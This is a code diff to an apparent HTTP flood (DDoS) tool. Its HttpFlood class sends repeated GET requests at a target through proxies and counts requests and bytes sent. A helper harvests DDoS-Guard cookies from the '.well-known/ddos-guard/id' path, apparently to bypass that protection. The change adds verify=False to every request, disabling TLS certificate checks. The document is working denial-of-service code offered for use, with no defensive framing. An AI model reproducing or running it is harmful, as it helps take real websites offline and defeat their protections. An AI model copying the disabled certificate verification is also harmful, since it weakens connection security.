@@ -194,7 +194,7 @@ class Tools:
                 "TE": "trailers",
                 "DNT": "1"
             }
-            with s.get(url, headers=hdrs) as ss:
+            with s.get(url, headers=hdrs, verify=False) as ss:
                 for key, value in ss.cookies.items():
                     s.cookies.set_cookie(cookies.create_cookie(key, value))
             hdrs = {
@@ -224,7 +224,7 @@ class Tools:
                 "Sec-Fetch-Mode": "no-cors",
                 "Sec-Fetch-Site": "cross-site"
             }
-            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
+            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs, verify=False) as ss:
                 for key, value in ss.cookies.items():
                     s.cookies.set_cookie(cookies.create_cookie(key, value))
                 return s
@@ -810,12 +810,12 @@ class HttpFlood(Thread):
             for _ in range(self._rpc):
                 if pro:
                     with s.get(self._target.human_repr(),
-                               proxies=pro.asRequest()) as res:
+                               proxies=pro.asRequest(), verify=False) as res:
                         self.REQUESTS_SENT += 1
                         self.BYTES_SEND += Tools.sizeOfRequest(res)
                         continue
 
-                with s.get(self._target.human_repr()) as res:
+                with s.get(self._target.human_repr(), verify=False) as res:
                     self.REQUESTS_SENT += 1
                     self.BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
@@ -852,7 +852,7 @@ class HttpFlood(Thread):
                 for _ in range(min(self._rpc, 5)):
                     sleep(min(self._rpc, 5) / 100)
                     with ss.get(self._target.human_repr(),
-                                proxies=pro.asRequest()) as res:
+                                proxies=pro.asRequest(), verify=False) as res:
                         if b'<title>DDOS-GUARD</title>' in res.content[:100]:
                             break
                         self.REQUESTS_SENT += 1
@@ -895,12 +895,12 @@ class HttpFlood(Thread):
             for _ in range(self._rpc):
                 if pro:
                     with s.get(self._target.human_repr(),
-                               proxies=pro.asRequest()) as res:
+                               proxies=pro.asRequest(), verify=False) as res:
                         self.REQUESTS_SENT += 1
                         self.BYTES_SEND += Tools.sizeOfRequest(res)
                         continue
 
-                with s.get(self._target.human_repr()) as res:
+                with s.get(self._target.human_repr(), verify=False) as res:
                     self.REQUESTS_SENT += 1
                     self.BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
